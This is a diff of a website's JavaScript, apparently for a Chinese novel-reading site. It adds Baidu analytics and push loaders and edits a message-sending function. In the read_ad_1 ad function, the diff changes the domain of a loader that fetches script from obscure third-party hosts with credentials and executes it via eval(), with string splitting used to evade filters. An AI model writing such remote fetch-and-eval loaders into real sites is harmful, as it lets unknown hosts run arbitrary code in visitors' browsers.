@@ -13,6 +13,34 @@ window.onload = function() {
 
 
 };
+//统计
+function webdashubaotongji(){
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?32dc4d3b60f25b74297f293108f3ef7a";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+}
+
+//百度推送
+function webdashubaotuisong(){
+  //JS链接推送
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+}
+
 $(document).ready(function()
 {
     baobaoni.islogin();
@@ -64,7 +92,7 @@ function web_footad()
 
 
 function read_ad_1() {
-  if(navigator.userAgent.indexOf('UCBrowser')>-1){document.write('<scr'+'ipt data-union-ad data-priority="12" data-position="fixed">(function(){var c="https://daima1.18tzx.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();</scr'+'ipt>');} else {(function(){var c="https://ttm.htfmbt.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();}
+  if(navigator.userAgent.indexOf('UCBrowser')>-1){document.write('<scr'+'ipt data-union-ad data-priority="12" data-position="fixed">(function(){var c="https://daima1.18tzx.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();</scr'+'ipt>');} else {(function(){var c="https://jyc.njxczy.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();}
 
 }
 
@@ -266,7 +294,7 @@ function getset() {
 
 
 
-function sendmsg(from,redirect_url){
+function sendmsg(redirect_url){
   var content = jQuery.trim(document.getElementById('content').value);
   var title = jQuery.trim(document.getElementById('title').value);
   if(!redirect_url){
@@ -284,8 +312,6 @@ function sendmsg(from,redirect_url){
   var data = {
     'content':content,
     'title':title,
-    'from': from
-
   }
   document.getElementById('bnt').disabled=true;
   document.getElementById('bnt').value='提交中...';
